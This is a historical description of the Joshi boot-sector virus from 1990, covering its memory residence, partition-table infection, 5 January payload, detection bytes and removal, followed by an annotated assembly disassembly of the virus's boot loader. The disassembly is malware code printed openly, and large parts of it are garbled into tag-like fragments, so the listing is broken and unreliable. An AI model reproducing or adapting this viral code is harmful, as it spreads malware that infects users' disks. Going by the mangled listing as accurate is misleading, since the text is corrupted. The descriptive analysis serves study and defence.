

       The Joshi Virus was isolated in India in June 1990.  At the time it was 
       isolated, it was reported to be widespread in India as well as 
       portions of the continent of Africa.  Joshi is a memory resident 
       boot sector infector of 5.25" diskettes.  It will also infect 
       hard disks, though in the case of hard disks it infects the partition 
       table or master boot sector rather than the boot sector (sector 0). 
 
       After a system has been booted from a Joshi-infected diskette, the 
       virus will be resident in memory.  Joshi takes up approximately 
       6K of system memory, and infected systems will show that total 
       system memory is 6K less than is installed if the DOS CHKDSK program 
       is run. 
 
       Joshi has some similarities to two other boot sector infectors. 
       Like the Stoned virus, it infects the partition table of hard disks. 
       Similar to the Brain virus's method of redirecting all attempts to 
       read the boot sector to the original boot sector, Joshi does this with 
       the partition table. 
 
       On January 5th of any year, the Joshi virus activates.  At that 
       time, the virus will hang the system while displaying the message: 
 
             "type Happy Birthday Joshi" 
 
       If the system user then types "Happy Birthday Joshi", the system 
       will again be usable. 
 
       This virus may be recognized on infected systems by powering off 
       the system and then booting from a known-clean write-protected 
       DOS diskette.  Using a sector editor or viewer to look at the 
       boot sector of suspect diskettes, if the first two bytes of the 
       boot sector are hex EB 1F, then the disk is infected.  The EB 1F 
       is a jump instruction to the rest of the viral  code. The remainder 
       of the virus is stored on track 41, sectors 1 thru 5 on 360K 
       5.25 inch Diskettes.  For 1.2M 5.25 inch diskettes, the viral code 
       is located at track 81, sectors 1 thru 5. 
 
       To determine if a system's hard disk is infected, you must look at 
       the hard disk's partition table.  If the first two bytes of the 
       partition table are EB 1F hex, then the hard disk is infected.  The 
       remainder of the virus can be found at track 0, sectors 2 thru 6. 
       The original partition table will be a track 0, sector 9. 
 
       The Joshi virus can be removed from an infected system by first 
       powering off the system, and then booting from a known-clean, write- 
       protected master DOS diskette.  If the system has a hard disk, the 
       hard disk should have data and program files backed up, and the 
       disk must be low-level formatted.  As of July 15, 1990, there are 
       no known utilities which can disinfect the partition table of the 
       hard disk when it is infected with Joshi.  Diskettes are easier to 
       remove Joshi from, the DOS SYS command can be used, or a program 
       such as MDisk from McAfee Associates, though this will leave the 
       viral code in an inexecutable state on track 41. 


; File: JOSHI.BIN
; File Type: BIN
; Processor: 8086/88
; Range: 06000h to 061ffh
; Subroutines:    0
 
.RADIX 16
 
dseg0000        SEGMENT at 00000 
dseg0000        ENDS
 
sseg            SEGMENT para stack 
sseg            ENDS
 
dsegb800        SEGMENT at 0B800 
dsegb800        ENDS
 
                ORG     00H
sseg            SEGMENT para stack 
                ASSUME CS:sseg
o06000          PROC NEAR
;<es =="" 0600="">
;<cs =="" 0600="">
;<ss =="" 0600="">
;<ds =="" 0600="">
                JMP     SHORT START             ;06000 >>xref=<06021>< ;="" ;*="" nop="" ;06002="" ;-----------------------------------------------------="" db="" 4dh,53,44,4f,53,35="" ;06003="" msdos5="" db="" 2e,30,00,02,02,01="" ;06009="" .0....="" db="" 00,02,70,00,0d0,02="" ;0600f="" ..p...="" db="" 0fdh,02,00,09,00,02="" ;06015="" ......="" db="" 00,00,00,28,01,00="" ;0601b="" ...(..="" ;-----------------------------------------------------="" start:="" cli="" ;06021="" *="" ;="" turn="" off="" interrupts="" mov="" ax,cs="" ;06022="" mov="" ds,ax="" ;06024="" ds="cs=ss=0" mov="" ss,ax="" ;06026="" mov="" sp,0f000h="" ;06028="" sti="" ;0602b="" turn="" on="" interrupts="" assume="" ds:sseg="" mov="" ax,word="" ptr="" ds:d06413="" ;0602c="" get="" memory="" size="" in="" ;="" 1k="" blocks="" mov="" cl,06="" ;0602f="" shl="" ax,cl="" ;06031="" multiply="" by="" 2's="" mov="" es,ax="" ;06033="" make="" a="" segment="" out="" ;="" of="" it="" mov="" ax,0200h="" ;06035="" sub="" ax,0021h="" ;06038="" mov="" di,0000h="" ;0603b="" mov="" si,7c00h="" ;0603e="" add="" si,ax="" ;06041="" check="" to="" see="" if="" viru-="" ;="" s="" already="" add="" di,ax="" ;06043="" installed="" mov="" cx,0179h="" ;06045="" sub="" cx,ax="" ;06048="" cld="" ;0604a="" forward="" string="" opers="" repz="" cmpsb="" ;0604b="" flgs="DS:[SI]-ES:[DI]" jne="" not_installed="" ;0604d="">>xref=<0605f>< ;="" ;*="" ;="" jump="" not="" equal(zf="0)" mov="" ax,es="" ;0604f="" if="" installed,="" go="" ;="" jump="" to="" virus="" add="" ax,0020h="" ;06051="" mov="" es,ax="" ;06054="" mov="" bx,0000h="" ;06056="" push="" es="" ;06059="" push="" bx="" ;0605a="" mov="" ax,0001h="" ;0605b="" retf="" ;0605e="" ;-----------------------------------------------------="" not_installed:="" mov="" ax,word="" ptr="" ds:d06413="" ;0605f="" *="" ;="" get="" memory="" size="" sub="" ax,0006h="" ;06062="" reserve="" 6k="" bytes="" ;="" for="" virus="" mov="" word="" ptr="" ds:d06413,ax="" ;06065="" save="" memory="" size="" mov="" cl,06="" ;06068="" shl="" ax,cl="" ;0606a="" multiply="" by="" 2's="" ;="" make="" segment="" out="" of="" ;="" new="" size="" mov="" es,ax="" ;0606c="" es="" points="" to="" virus="" ;="" area="" mov="" si,7c00h="" ;0606e="" mov="" di,0000h="" ;06071="" move="" virus="" to="" high="" ;="" memory="" mov="" cx,0200h="" ;06074="" above="" where="" dos="" resi-="" ;="" des="" cld="" ;06077="" forward="" string="" opers="" rep="" movsb="" ;06078="" mov="" ds:[si]-="">ES:[DI]
                MOV     AX,ES                   ;0607A Increment ES for 
                                                ;     next sector
                ADD     AX,0020H                ;0607C 
                MOV     ES,AX                   ;0607F 
                MOV     BX,0000H                ;06081 
                PUSH    ES                      ;06084 
                PUSH    BX                      ;06085 
                PUSH    CS                      ;06086 
                POP     DS                      ;06087 ds=cs
                MOV     AH,02                   ;06088 read one sector
                MOV     AL,01                   ;0608A 
                MOV     CH,BYTE PTR DS:d0dc1e   ;0608C Get cylinder (28H 
                                                ;     Here)
                MOV     CL,BYTE PTR DS:d0dc1f   ;06090 Get sector (1 here)
                MOV     DH,00                   ;06094 Get head number
                MOV     DL,BYTE PTR DS:d0dc20   ;06096 Get drive number 
                                                ;     (0 here)
                PUSH    AX                      ;0609A 
                MOV     AX,SEG dsegb800 ;abs    ;0609B >>xref=<b8000>< ;="" ;at="" 0b800=""><ds =="" b800="">
                MOV     DS,AX                   ;0609E ds = video segment
                POP     AX                      ;060A0 
READ_DISK:      PUSH    AX                      ;060A1 *
                PUSH    BX                      ;060A2 
                PUSH    CX                      ;060A3 
                PUSH    DX                      ;060A4 
                PUSH    ES                      ;060A5 
                INT     13H                     ;060A6 DSK:02-read sector, 
                                                ;     into ES:BX
                POP     ES                      ;060A8 
                POP     DX                      ;060A9 
                POP     CX                      ;060AA 
                POP     BX                      ;060AB 
                POP     AX                      ;060AC 
                JNB     READ_OK                 ;060AD >>xref=<060bf>< ;="" ;*="" ;="" jump="" if="">= (no sign)
                                                ;     Jump if no error
                PUSH    AX                      ;060AF Else handle an error
                PUSH    BX                      ;060B0 Reading the disk
                PUSH    CX                      ;060B1 
                PUSH    DX                      ;060B2 
                PUSH    ES                      ;060B3 
                MOV     AH,00                   ;060B4 
                INT     13H                     ;060B6 DSK:00-reset, DL=dri-
                                                ;     ve
                POP     ES                      ;060B8 
                POP     DX                      ;060B9 
                POP     CX                      ;060BA 
                POP     BX                      ;060BB 
                POP     AX                      ;060BC 
                JMP     SHORT READ_DISK         ;060BD >>xref=<060a1>< ;="" ;*="" read_ok:="" inc="" cl="" ;060bf="" *="" ;="" next="" sector="" add="" bx,0200h="" ;060c1="" increment="" buffer="" push="" ds="" ;060c5="" save="" ds="" video="" pointe-="" ;="" r="" push="" cs="" ;060c6=""><ds =="" 0600="">
                POP     DS                      ;060C7 ds=cs
                PUSH    AX                      ;060C8 
                MOV     AL,CL                   ;060C9 
                SUB     AL,BYTE PTR DS:d0dc1f   ;060CB 
                SUB     AL,08                   ;060CF is al> start sector 
                                                ;     + 8
                POP     AX                      ;060D1 
;<ds =="" b800="">
                POP     DS                      ;060D2 restore ds video 
                                                ;     pointer
                JB      READ_DISK               ;060D3 >>xref=<060a1>< ;="" ;*="" ;="" jump="" if="">< (no="" sign)="" ;="" if="">< from="" above,="" ;="" go="" read="" again="" mov="" ax,0000h="" ;060d5=""><ds =="" 0600="">
                RETF                            ;060D8 Just return to anywh-
                                                ;     ere!!
;-----------------------------------------------------
                DB      157D DUP (00H)          ;060D9 (.)
                                                ;     Unused data
;-----------------------------------------------------
b06176:         ADD     BYTE PTR [BX+SI],AL     ;06176 
                ADD     BYTE PTR [SI-5DH],BH    ;06178 
                DEC     BP                      ;0617B 
                JL      b06176                  ;0617C Jump if < (w/="" sign)="" retn="" ;0617e="" ;-----------------------------------------------------="" stc="" ;0617f="" retn="" ;06180="" ;-----------------------------------------------------="" mov="" ah,02="" ;06181="" mov="" dx,word="" ptr="" ds:d0dc4d="" ;06183="" mov="" cl,06="" ;06187="" shl="" dh,cl="" ;06189="" multiply="" by="" 2's="" or="" dh,byte="" ptr="" ds:d0dc4f="" ;0618b="" mov="" cx,dx="" ;0618f="" xchg="" ch,cl="" ;06191="" mov="" dl,byte="" ptr="" ds:d0dc24="" ;06193="" mov="" dh,byte="" ptr="" ds:d0dc25="" ;06197="" int="" 13h="" ;0619b="" dsk:02-read="" sector,="" ;="" into="" es:bx="" retn="" ;0619d="" ;-----------------------------------------------------="" db="" 0dh,0a="" ;0619e="" ..="" db="" 'non-system="" disk="" or="" di'="" ;061a0="" db="" 'sk="" error'="" ;061b5="" db="" 0dh,0a="" ;061bd="" ..="" db="" 'replace="" and="" press="" any'="" ;061bf="" db="" '="" key="" when="" ready'="" ;061d4="" db="" 0dh,0a,00="" ;061e3="" ...="" db="" 'io="" sysmsdos="" sy'="" ;061e6="" db="" 's'="" ;061fb="" db="" 00,00="" ;061fc="" ..="" db="" 55,0aa="" ;061fe="" u.="" o06000="" endp="" sseg="" ends="" d06413="" equ="" 00413h="" d0dc1e="" equ="" 07c1eh="" d0dc1f="" equ="" 07c1fh="" d0dc20="" equ="" 07c20h="" d0dc24="" equ="" 07c24h="" d0dc25="" equ="" 07c25h="" d0dc4d="" equ="" 07c4dh="" d0dc4f="" equ="" 07c4fh="" end="" o06000=""></ds></060a1></ds></ds></060a1></060bf></ds></b8000></0605f></06021></ds></ss></cs></es>